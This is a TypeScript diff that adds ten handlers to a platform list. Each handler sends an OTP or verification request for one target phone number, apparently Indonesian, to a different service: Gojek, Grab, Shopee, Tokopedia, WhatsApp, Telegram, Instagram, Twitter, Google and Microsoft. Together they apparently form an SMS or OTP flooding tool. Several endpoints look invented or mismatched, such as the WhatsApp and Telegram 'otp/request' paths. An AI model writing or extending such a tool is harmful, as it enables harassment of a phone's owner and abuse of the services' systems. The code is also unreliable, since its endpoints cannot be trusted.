@@ -361,4 +361,224 @@ export const ALL_PLATFORMS: PlatformDef[] = [
       }
     },
   },
+  // Endpoint 1: Gojek
+  {
+    id: 9,
+    name: 'Gojek',
+    category: 'Ride / Food',
+    handler: async (p62: string) => {
+      try {
+        const res = await safeFetch('https://api.gojekapi.com/v3/customers/request_otp', {
+          method: 'POST',
+          headers: {
+            'Accept': 'application/json, text/plain, */*',
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ phone_number: fmtphone(p62), country_code: '62' }),
+        });
+        const text = await res.text();
+        return { status: res.status, text };
+      } catch (err: any) {
+        return { status: 0, text: err?.message || 'Timeout' };
+      }
+    },
+  },
+  // Endpoint 2: Grab
+  {
+    id: 10,
+    name: 'Grab',
+    category: 'Ride / Food',
+    handler: async (p62: string) => {
+      try {
+        const res = await safeFetch('https://api.grab.com/grabid/v1/phone/otp', {
+          method: 'POST',
+          headers: {
+            'Accept': 'application/json, text/plain, */*',
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ phone: fmtphone(p62), countryCode: 'ID' }),
+        });
+        const text = await res.text();
+        return { status: res.status, text };
+      } catch (err: any) {
+        return { status: 0, text: err?.message || 'Timeout' };
+      }
+    },
+  },
+  // Endpoint 3: Shopee
+  {
+    id: 11,
+    name: 'Shopee',
+    category: 'E-Commerce',
+    handler: async (p62: string) => {
+      try {
+        const res = await safeFetch('https://shopee.co.id/api/v2/authentication/request_otp', {
+          method: 'POST',
+          headers: {
+            'Accept': 'application/json, text/plain, */*',
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ mobile: fmt08(p62) }),
+        });
+        const text = await res.text();
+        return { status: res.status, text };
+      } catch (err: any) {
+        return { status: 0, text: err?.message || 'Timeout' };
+      }
+    },
+  },
+  // Endpoint 4: Tokopedia
+  {
+    id: 12,
+    name: 'Tokopedia',
+    category: 'E-Commerce',
+    handler: async (p62: string) => {
+      try {
+        const res = await safeFetch('https://accounts.tokopedia.com/v1/otp/request', {
+          method: 'POST',
+          headers: {
+            'Accept': 'application/json, text/plain, */*',
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ phone: fmt08(p62), platform: 'web' }),
+        });
+        const text = await res.text();
+        return { status: res.status, text };
+      } catch (err: any) {
+        return { status: 0, text: err?.message || 'Timeout' };
+      }
+    },
+  },
+  // Endpoint 5: WhatsApp
+  {
+    id: 13,
+    name: 'WhatsApp',
+    category: 'Messaging',
+    handler: async (p62: string) => {
+      try {
+        const res = await safeFetch('https://web.whatsapp.com/otp/request', {
+          method: 'POST',
+          headers: {
+            'Accept': 'application/json, text/plain, */*',
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ phone_number: fmtplus(p62) }),
+        });
+        const text = await res.text();
+        return { status: res.status, text };
+      } catch (err: any) {
+        return { status: 0, text: err?.message || 'Timeout' };
+      }
+    },
+  },
+  // Endpoint 6: Telegram
+  {
+    id: 14,
+    name: 'Telegram',
+    category: 'Messaging',
+    handler: async (p62: string) => {
+      try {
+        const res = await safeFetch('https://telegram.org/otp/request', {
+          method: 'POST',
+          headers: {
+            'Accept': 'application/json, text/plain, */*',
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ phone: fmtplus(p62), api_id: 1 }),
+        });
+        const text = await res.text();
+        return { status: res.status, text };
+      } catch (err: any) {
+        return { status: 0, text: err?.message || 'Timeout' };
+      }
+    },
+  },
+  // Endpoint 7: Instagram
+  {
+    id: 15,
+    name: 'Instagram',
+    category: 'Social Media',
+    handler: async (p62: string) => {
+      try {
+        const res = await safeFetch('https://i.instagram.com/api/v1/accounts/send_verify_email/', {
+          method: 'POST',
+          headers: {
+            'Accept': 'application/json, text/plain, */*',
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ phone_number: fmtplus(p62) }),
+        });
+        const text = await res.text();
+        return { status: res.status, text };
+      } catch (err: any) {
+        return { status: 0, text: err?.message || 'Timeout' };
+      }
+    },
+  },
+  // Endpoint 8: Twitter/X
+  {
+    id: 16,
+    name: 'Twitter (X)',
+    category: 'Social Media',
+    handler: async (p62: string) => {
+      try {
+        const res = await safeFetch('https://api.twitter.com/1.1/account/phone_verification.json', {
+          method: 'POST',
+          headers: {
+            'Accept': 'application/json, text/plain, */*',
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ phone: fmtplus(p62) }),
+        });
+        const text = await res.text();
+        return { status: res.status, text };
+      } catch (err: any) {
+        return { status: 0, text: err?.message || 'Timeout' };
+      }
+    },
+  },
+  // Endpoint 9: Gmail/Google
+  {
+    id: 17,
+    name: 'Google / Gmail',
+    category: 'Big Tech',
+    handler: async (p62: string) => {
+      try {
+        const res = await safeFetch('https://accounts.google.com/_/signin/challenge', {
+          method: 'POST',
+          headers: {
+            'Accept': 'application/json, text/plain, */*',
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ identifier: fmtplus(p62) }),
+        });
+        const text = await res.text();
+        return { status: res.status, text };
+      } catch (err: any) {
+        return { status: 0, text: err?.message || 'Timeout' };
+      }
+    },
+  },
+  // Endpoint 10: Microsoft
+  {
+    id: 18,
+    name: 'Microsoft',
+    category: 'Big Tech',
+    handler: async (p62: string) => {
+      try {
+        const res = await safeFetch('https://login.microsoftonline.com/common/oauth2/v2.0/authorize', {
+          method: 'POST',
+          headers: {
+            'Accept': 'application/json, text/plain, */*',
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ phone: fmtplus(p62) }),
+        });
+        const text = await res.text();
+        return { status: res.status, text };
+      } catch (err: any) {
+        return { status: 0, text: err?.message || 'Timeout' };
+      }
+    },
+  },
 ];
